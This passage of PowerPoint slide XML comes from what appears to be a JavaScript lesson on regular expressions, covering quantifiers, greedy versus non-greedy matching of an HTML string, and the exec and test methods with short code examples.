                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1456046569"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1883228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9494D23-4350-43D9-88BA-4D1553960C30}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Regular Expression Quantifiers</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Taulukko 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{25B9E564-C694-444F-99B7-1137F43296E3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph sz="half" idx="1"/>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1856590087"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="616496" y="1404467"/>
          <a:ext cx="10959008" cy="3774289"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="2174032">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3889540772"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="8784976">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1180203577"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="397298">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Characters</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Meaning</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4109132281"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="351897">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>x*</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Zero or more preceding regular expression x</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3263240797"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="351897">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>x+</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>At least 1 or more preceding regular expression x</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2181995306"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="351897">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>x?</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Optional (1 or 0) preceding regular expression x</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3720809918"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="351897">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>x{n}</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Exactly n (positive integer) copies of preceding regular expression x</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3672289967"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="351897">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>x{n,}</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>At least n (positive integer) copies preceding regular expression x</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="662578793"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="615821">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>x{</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>n,m</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>} </a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>From n (positive integer) to m (larger positive integer) amount of preceding regular expression x</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="650820582"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="908111">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>x*?, x+?, x??, x{n}?, x{n,}?, x{</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>n,m</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>}?</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Non-greedy version of above, trying to match as few characters as possible. The above ones are greedy, which try to match as many as possible.</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2680530250"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Sisällön paikkamerkki 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E1EDC8D6-3416-450E-B5D4-EAAD315176FD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="623392" y="5301208"/>
            <a:ext cx="10959008" cy="1224136"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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html</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"&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>body</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;&lt;h1&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Heading</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/h1&gt;&lt;p&gt;Some </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>text</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>...&lt;/p&gt;&lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>body</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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html</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match</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/&lt;.</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&gt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>g</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>));</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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html</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match</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/&lt;.</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&gt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>g</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>));</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="39541658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48DA5C0-75BB-4C53-B44D-D447A3BD8961}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Regular Expression Methods</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Taulukko 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D55D7A04-1064-461B-A2EF-FE388BDF93CD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph sz="half" idx="1"/>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="896697764"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="1600200"/>
          <a:ext cx="10972800" cy="1112520"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="3398168">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3413780952"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="7574632">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="651286329"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Method</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Explanation</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="531934421"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>regexp.exec</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>(string)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Return array of matches or null</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3998174245"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>regexp.test</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>(string)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Return true if matches the string</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="470364856"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Sisällön paikkamerkki 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{93F9E779-D640-48E9-B65D-3F518B2D4215}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="2895282"/>
            <a:ext cx="10972800" cy="2913188"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>const</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>regex1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>RegExp</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java</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gi</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p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>const</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>str</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Languages</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>: JavaScript, Python and Java'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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matches</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>while</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matches</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>regex1</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exec</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>str</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>)) !== </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>null</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Found</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>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matches</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
